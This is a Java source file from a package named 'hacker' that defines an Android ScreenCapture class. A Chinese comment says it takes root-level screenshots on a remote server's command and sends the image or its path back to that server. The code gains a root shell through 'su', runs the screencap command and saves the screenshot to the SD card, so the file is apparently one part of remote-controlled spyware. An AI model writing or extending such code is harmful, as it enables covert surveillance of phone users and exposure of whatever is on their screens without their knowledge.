/**
 * 
 */
package com.fan.hacker;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;

import com.sun.org.apache.bcel.internal.generic.RETURN;

import android.os.Environment;

/**
 * @author Administrator
 *此类用来实现有root权限的情况下抓屏，这个类可以根据服务器的命令来定时运行，并将保存图片的路径返回给服务器或直接返回图
 */
public class ScreenCapture {
	
	public static String screenCap() {
		Process sh;
		try {
			sh = Runtime.getRuntime().exec("su", null,null);
		    OutputStream  os = sh.getOutputStream();
		    os.write(("/system/bin/screencap -p " + "/sdcard/omg.png").getBytes("ASCII"));
		    os.flush();
		    os.close();
		    try {
				sh.waitFor();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String pathName =Environment.getExternalStorageDirectory()+ File.separator +"omg.png";//得到文件的全名称，含后缀
		return pathName;
		//下面的代码将png文件转为jpg文件
//		Bitmap screen = BitmapFactory.decodeFile(Environment.getExternalStorageDirectory()+         
//		File.separator +"img.png");
	//
//		//my code for saving
//		    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
//		    screen.compress(Bitmap.CompressFormat.JPEG, 15, bytes);
	//
//		//you can create a new file name "test.jpg" in sdcard folder.
	//
//		File f = new File(Environment.getExternalStorageDirectory()+ File.separator + "test.jpg");
//	            try {
//					f.createNewFile();
//					//write the bytes in file
//				    FileOutputStream fo = new FileOutputStream(f);
//				    fo.write(bytes.toByteArray());
//				// remember close de FileOutput
	//
//				    fo.close();
//				} catch (IOException e) {
//					// TODO Auto-generated catch block
//					e.printStackTrace();
//				}

	}
	
	
	

}
